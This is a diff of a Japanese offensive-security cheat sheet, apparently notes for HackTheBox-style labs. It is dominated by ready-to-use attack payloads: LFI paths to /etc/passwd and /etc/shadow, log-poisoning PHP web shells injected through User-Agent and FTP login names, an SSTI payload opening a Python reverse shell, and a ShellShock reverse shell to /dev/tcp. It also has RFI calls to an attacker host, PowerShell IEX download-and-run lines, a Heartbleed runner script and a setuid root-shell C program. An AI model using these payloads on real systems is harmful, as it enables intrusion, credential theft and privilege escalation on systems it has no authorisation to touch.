@@ -400,8 +400,15 @@ HTTPレスポンスの改ざんが可能。
 ### ディレクトリトラバーサル, LFI(ローカルファイルインクルード)
 file_get_contents関数の不備
 ```
-http://<url>/script.php?page=../../../../../../../../etc/passwd
-http://<url>/script.php?page=../../../../../../../../etc/hosts
+http://<url>/browse.php?files=../../../../../../../../etc/passwd
+http://<url>/browse.php?files=../../../../../../../../etc/hosts
+```
+```
+http://<url>/browse.php?files=php://filter/convert.base64-encode/resource=phpinfo.php
+echo -n PD9waHAKcGhwaW5mbygpOwo/Pgo= | base64 -d
+```
+```
+http://<url>/browse.php?files=expected://ls
 ```
 
 Examples: 
@@ -415,7 +422,7 @@ http://example.com/index.php?page=....//....//etc/passwd
 ```
 
 #### LFIを利用して読み取りを狙うファイル:  
-Linux
+Linux:
 ```
 /etc/passwd
 /etc/shadow
@@ -429,16 +436,40 @@ Linux
 /home/<username>/.ssh/authorized_keys
 /home/<username>/.ssh/id_rsa
 ```
-Windows
+Windows:
 ```
 /boot.ini
 /autoexec.bat
 /windows/system32/drivers/etc/hosts
 /windows/repair/S
 ```
+#### Log Poisoning(LFI2RCE)
+ログファイルにペイロードを書き込んで、LFIを利用してアクセスすることでペイロードを実行する。  
+
+apache2:  
+User-Agentに下記のペイロードを書き込んで送信する。  
+```
+User-Agent: <?php system($_GET['cmd']); ?>
+```
+```
+/var/log/apache2/access.log
+http://<url>/browse.php?files=/var/log/apache2/access.log&cmd=whoami
+```
+vsftpd:  
+ftpに接続してから、下記のペイロードを入力する。  
+```
+ftp 10.10.10.1
+Connected to 10.10.10.1.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.1:kali): <?php system($_GET['cmd']); ?>
+```
+```
+/var/log/vsftpd.log
+http://<url>/browse.php?files=/var/log/vsftpd.log&cmd=whoami
+```
 
 ### RFI
-allow_url_fopenオプションがONになっている場合に有効。
+allow_url_includeオプションがONになっている場合に有効。
 ```
 http://<Target IP>/<file>.php?file=http://<Attacker IP>/rs.php
 ```
@@ -524,7 +555,6 @@ SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げ
 例) http://website.com/form?dst=/forms/contact
 ```
 
-
 ### SSTI(サーバサイドテンプレートインジェクション)
 ![](./image/2021-04-14-15-23-34.png)
 
@@ -533,10 +563,11 @@ SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げ
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-### ShellShock
-CGIに使用される拡張子を指定して、feroxbusteerなどをかける。
+### ShellShock(CVE-2014-6271)
+CGIに使用される拡張子を指定して、feroxbusteerなどをかける。  
+CGIスクリプトに使用される言語がbashであればそのまま悪用可能であり、PerlやPythonなどの場合でもsystem関数などが使用されていれば悪用される可能性がある。
 ```
-feroxbuster -u http://10.10.10.56/cgi-bin/ -x cgi,sh,pl
+feroxbuster -u http://10.10.10.56/cgi-bin/ -x cgi,sh,pl,py,php
 ```
 ShellShockが実行される環境では変数が空であるため、コマンドにはフルパスが必要。
 ```
@@ -548,6 +579,22 @@ User-Agent: () { :;}; echo; /usr/bin/id
 ```
 User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.5/1234 0>&1
 ```
+
+### Heartbleed(CVE-2014-0160)
+OpenSSLの脆弱性。  
+サーバの秘密鍵や利用者のパスワードを盗み出すことができる可能性がある。  
+下記のスクリプトを利用する場合はgrepで00 00...を省くと簡潔に出力できる。  
+https://www.exploit-db.com/exploits/32745
+```
+import os
+
+cmd = "python2 32745.py 10.10.10.79 | grep -v '00 00 00 00 00 00 00 00 00'"
+for i in range(10):
+    os.system(cmd)
+```
+使いやすさ的には下記のスクリプトがオススメ。  
+heartbleed.py:  
+https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
 
 
 ## CMS
@@ -576,24 +623,31 @@ wp-config.php
 ```
 
 ### WPScan
-パッシブスキャン
+パッシブスキャン:
 ```
 wpscan --update
-wpscan --url <url> -e vp #脆弱なプラグイン特定
-wpscan --url <url> -e vt #脆弱なTheme特定
 wpscan --url <url> -e u #ユーザの列挙
-wpscan --url <url> -e u t vp -o <output filename>
-```
-アグレッシブスキャン
-```
-wpscan --url <url> -e vp --plugins-detection aggressive
+wpscan --url <url> -e vt #脆弱なTheme特定
+wpscan --url <url> -e vp #脆弱なプラグイン特定
+wpscan --url <url> -e u,vt,vp -o <output filename>
 ```
 - -url...対象のURL指定
 - -e 
   - u...usernameの列挙
   - vt...脆弱なテーマを列挙
+  - at...全てのテーマを列挙
   - vp...脆弱性のあるプラグインを列挙
+  - ap...全てのプラグインを列挙
 - -o...ファイル出力
+
+アグレッシブスキャン:
+```
+wpscan --url <url> -e u,vt,vp --plugins-detection aggressive
+```
+アグレッシブスキャン(api-tokenの使用):
+```
+wpscan --url <url> -e ap --plugins-detection aggressive --api-token [自分のapi-token]
+```
 
 #### リスト型攻撃/パスワード推測攻撃
 ```
@@ -1464,6 +1518,10 @@ pyenv global 2.7.18
 ```
 
 ## Docker
+```
+docker run -v <ホストの絶対パス:コンテナの絶対パス> --name <コンテナ名> -it <イメージ名> /bin/bash
+docker run -v /Users/<ユーザ名>/Desktop:/root --name kali -it kalilinux /bin/bash
+```
 Buildx:
 クロスコンパイル用環境構築
 ```
@@ -1472,6 +1530,11 @@ docker run --privileged --rm tonistiigi/binfmt --install all
 ```
 docker pull kalilinux/kali-rolling:arm64
 docker pull kalilinux/kali-rolling:latest --platform linux/arm64
+```
+
+gdb(ptrace):
+```
+docker run --name <コンテナ名> -it --cap-add=SYS_PTRACE --security-opt="seccomp=unconfined" <イメージ名> /bin/bash
 ```
 
 ## x86用gccコンパイル
@@ -1830,13 +1893,6 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 このソフトウェアには既知のエクスプロイトが存在する(CVE-2016-1531)。  
 これらを利用してエクスプロイトすることで権限昇格できる可能性がある。
 
-### これまでにHackTheBoxなどで発見した権限昇格に利用できるSUIDバイナリ
-```
-exim-4.84-3
-nfsen-1.3.7
-screen-4.5.0
-keybase-redirector
-```
 
 ## SUID/SGID Executables - Shared Object Injection
 SUID実行可能ファイル(今回はsuid-soという名前の実行可能ファイル)が共有オブジェクトインジェクションに対して脆弱な場合、権限昇格できる可能性がある。  
@@ -1967,6 +2023,7 @@ Bashデバッグを有効にし、PS4変数を/bin/bashのSUIDバージョンを
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 -pを指定して、/tmp/rootbash実行可能ファイルを実行して、rootシェルを取得する。
+
 ## SUID/SGID Executables - Capability
 SUIDはSet User IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
 これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
@@ -2155,6 +2212,18 @@ User www-data may run the following commands on bashed:
 www-data@bashed:/$ sudo -u scriptmanager /bin/bash
 scriptmanager@bashed:/$ whoami
 scriptmanager
+```
+
+### setuid
+```
+#include <unistd.h>
+
+int main()
+{
+    setuid(0);
+    execl("/bin/bash", "bash", (char *)NULL);
+    return 0;
+}
 ```
 
 ## PrivEsc Tools(Linux)
@@ -2424,6 +2493,7 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse sh
 net start <Service Name>
 ```
 
+
 ## Registry - AutoRuns
 レジストリにAutoRun実行可能ファイルを照会する。
 ```
@@ -2519,6 +2589,7 @@ pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュ�
 例)
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.12.15 cmd.exe
 ```
+
 ## Scheduled Tasks
 スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを取得することができる。
 ```
@@ -2677,7 +2748,29 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.3:8000/Sherlo
 ```
 
 ### Watson.ps1
+[comming soon]
 
+### Driver Exploit
+下記のコマンドでシステムにインストールされているドライバーを列挙する。  
+```
+driverquery /v
+```
+サードパーティのドライバーが存在する場合、パッチが適切に当てられていない可能性があり権限昇格に利用できる可能性がある。  
+例) USBPcap
+```
+┌──(root💀96a278f1d4e0)-[/]
+└─# searchsploit USBPcap
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+USBPcap 1.1.0.0 (WireShark 2.2.5) - Local Privilege Escalation                    | windows/local/41542.c
+---------------------------------------------------------------------------------- ---------------------------------
+```
+```
+type C:\Program Files\USBPcap\USBPcap.inf
+...
+DriverVer=10/02/2015,1.1.0.0
+```
 
 ### Windows-kernel-exploits
 コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
